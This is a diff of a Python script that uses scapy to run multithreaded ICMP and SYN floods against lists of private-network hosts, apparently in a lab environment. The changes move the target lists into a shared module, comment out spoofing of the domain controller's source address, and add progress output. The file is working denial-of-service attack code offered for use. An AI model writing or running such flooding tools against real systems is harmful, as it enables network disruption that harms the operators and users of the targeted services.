@@ -1,14 +1,14 @@
+import sys
+from pathlib import Path
+
+sys.path.append(str(Path(__file__).parent.parent))
+
 from scapy.layers import inet
 from scapy.sendrecv import send
 import threading
 import time
 import random
-from utils import random_ip
-
-DOMAIN_CONTROLLER_IP = "10.10.10.21"
-
-LINUX_TARGET_IPS = ["10.10.10.101", "10.10.10.102", "10.10.10.103", "10.10.10.104"]
-WINDOWS_TARGET_IPS = ["10.10.10.21", "10.10.10.22", "10.10.10.23"]
+from utils import random_ip, LINUX_TARGET_IPS, WINDOWS_TARGET_IPS, DOMAIN_CONTROLLER_IP
 
 def icmp_flood_work(p):
     while True:
@@ -16,7 +16,8 @@ def icmp_flood_work(p):
         time.sleep(random.randrange(30)/1000)
 
 def icmp_flood(target_host):
-    packet = inet.IP(dst=target_host, src=DOMAIN_CONTROLLER_IP) / inet.ICMP()
+    # IP spoofing won't work :(
+    packet = inet.IP(dst=target_host) / inet.ICMP() # src=DOMAIN_CONTROLLER_IP 
     t = threading.Thread(target=icmp_flood_work, args=(packet,), daemon=True)
     t.start()
     return t
@@ -36,8 +37,10 @@ def main():
     icmp_threads = []
     syn_threads = []
     for ip in LINUX_TARGET_IPS + WINDOWS_TARGET_IPS:
+        print(f"Flooding {ip}...")
         icmp_threads.append(icmp_flood(ip))
         syn_threads.append(syn_flood(ip))
+    input("Press Enter to quit:")
 
 if __name__ == "__main__":
     main()
